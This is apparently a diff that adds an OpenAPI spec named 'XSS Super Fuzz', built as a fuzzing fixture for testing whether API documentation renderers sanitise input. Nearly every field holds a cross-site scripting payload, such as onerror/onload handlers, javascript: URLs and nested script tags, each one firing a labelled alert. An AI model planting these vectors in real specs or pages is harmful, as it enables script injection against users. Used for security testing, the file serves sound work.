@@ -1,0 +1,98 @@
+{
+  "openapi": "3.0.0",
+  "info": {
+    "title": "XSS Super Fuzz",
+    "version": "1.0.0",
+    "description": "<img src=1 onerror=alert('info_desc')><svg/onload=alert('svg_info')><iframe srcdoc=\"<script>alert('iframe_doc')</script>\"></iframe><math href=javascript:alert('math')></math><form><button formaction=javascript:alert('formaction')>CLICK</button></form>"
+  },
+  "externalDocs": {
+    "description": "<svg/onload=alert('externalDocs')>",
+    "url": "javascript:alert('externalDocs_url')"
+  },
+  "servers": [
+    {
+      "url": "https://api.example.com",
+      "description": "<img src=x onerror=alert('server_desc')>"
+    }
+  ],
+  "tags": [
+    {
+      "name": "fuzz",
+      "description": "<img src=x onerror=alert('tag_desc')>"
+    }
+  ],
+  "paths": {
+    "/fuzz": {
+      "get": {
+        "summary": "<svg/onload=alert('summary')>",
+        "description": "<img src=x onerror=alert('get_desc')>",
+        "parameters": [
+          {
+            "name": "q",
+            "in": "query",
+            "required": true,
+            "schema": {
+              "type": "string",
+              "example": "<img src=x onerror=alert('param_example')>"
+            },
+            "description": "<svg/onload=alert('param_desc')>"
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "<img src=x onerror=alert('resp_desc')>",
+            "content": {
+              "application/json": {
+                "example": {
+                  "data": "<svg/onload=alert('response_example')>"
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  },
+  "components": {
+    "securitySchemes": {
+      "oauth2": {
+        "type": "oauth2",
+        "flows": {
+          "implicit": {
+            "authorizationUrl": "javascript:alert('oauth2_auth')",
+            "scopes": {
+              "read": "<img src=x onerror=alert('scope_desc')>"
+            }
+          }
+        }
+      }
+    },
+    "schemas": {
+      "User": {
+        "type": "object",
+        "description": "<img src=x onerror=alert('schema_desc')>",
+        "properties": {
+          "id": {
+            "type": "string",
+            "example": "<svg/onload=alert('schema_example')>"
+          },
+          "profile": {
+            "type": "object",
+            "example": {
+              "bio": "<script>alert('deep_nested')</script>"
+            }
+          }
+        }
+      }
+    }
+  },
+  "security": [
+    {
+      "oauth2": ["read"]
+    }
+  ],
+  "x-logo": {
+    "url": "<img src=x onerror=alert('xlogo')>"
+  },
+  "x-custom": "<svg/onload=alert('xcustom')>"
+}
